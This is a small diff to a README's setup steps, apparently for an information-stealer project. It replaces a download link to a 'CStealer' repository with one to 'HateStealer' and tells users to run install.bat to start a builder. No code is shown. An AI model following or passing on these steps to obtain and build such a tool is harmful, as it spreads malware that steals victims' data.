@@ -81,7 +81,7 @@
 
                                                       ⬇️ Setup
 
-1. [Download source code zip](https://github.com/PIKA-X-777/CStealer/archive/refs/heads/main.zip)
+1. [Download source code zip](https://github.com/AdemoD3V/HateStealer/)
 2. Extract zip
 3. First install reqiured packages by double clicking `install.bat` file
 4. the builder will start after automatically
